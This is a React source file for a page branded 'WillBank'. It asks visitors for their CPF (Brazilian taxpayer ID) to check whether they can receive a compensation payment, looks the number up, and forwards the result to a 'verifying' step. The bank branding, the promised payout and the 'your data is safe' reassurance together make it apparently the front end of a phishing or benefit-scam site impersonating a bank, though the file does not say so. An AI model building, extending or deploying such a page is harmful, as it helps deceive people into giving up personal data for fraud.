import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { CPFInput } from "@/components/CPFInput";
import { validateCPF, unformatCPF, consultarCPF } from "@/lib/cpf";
import { ShieldCheck, Loader2, AlertTriangle } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";

const Login = () => {
  const navigate = useNavigate();
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleConsultar = async () => {
    setError("");
    
    const cpfNumbers = unformatCPF(cpf);
    
    if (cpfNumbers.length !== 11) {
      setError("Digite um CPF completo com 11 dígitos");
      return;
    }

    if (!validateCPF(cpf)) {
      setError("CPF inválido. Verifique os números digitados.");
      return;
    }

    setLoading(true);
    
    try {
      const data = await consultarCPF(cpf);
      // Navega para a página de verificação com os dados
      navigate("/verificando", { state: { cpfData: data } });
    } catch (err) {
      const message = err instanceof Error ? err.message : "Erro ao consultar CPF";
      toast({
        title: "Erro na consulta",
        description: message,
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader />

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-md">
          <div className="space-y-6">
            <div className="text-center space-y-2">
              <h1 className="text-2xl font-bold text-foreground">
                Consulte seu benefício
              </h1>
              <p className="text-muted-foreground">
                Descubra se você tem direito a receber uma indenização
              </p>
            </div>

            <p className="text-sm text-center text-muted-foreground">
              Digite seu CPF para <span className="underline font-medium text-foreground">consultar</span> se você possui benefícios disponíveis
            </p>

            <div className="space-y-2">
              <label className="text-sm font-medium text-muted-foreground">CPF</label>
              <CPFInput 
                value={cpf} 
                onChange={setCpf} 
                disabled={loading}
                error={!!error}
              />
              {error && (
                <div className="flex items-center gap-2 text-destructive text-sm">
                  <AlertTriangle className="w-4 h-4" />
                  <span>{error}</span>
                </div>
              )}
            </div>

            <Button 
              onClick={handleConsultar}
              disabled={loading || unformatCPF(cpf).length < 11}
              className="w-full h-12 text-base font-semibold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
                  Consultando...
                </>
              ) : (
                "Consultar benefício"
              )}
            </Button>

            {/* Security Footer */}
            <div className="flex items-center justify-center gap-2 pt-4">
              <ShieldCheck className="w-4 h-4 text-muted-foreground" />
              <span className="text-xs text-muted-foreground">
                Seus dados estão protegidos e seguros
              </span>
            </div>
          </div>
        </WillBankCard>
      </main>
    </div>
  );
};

export default Login;
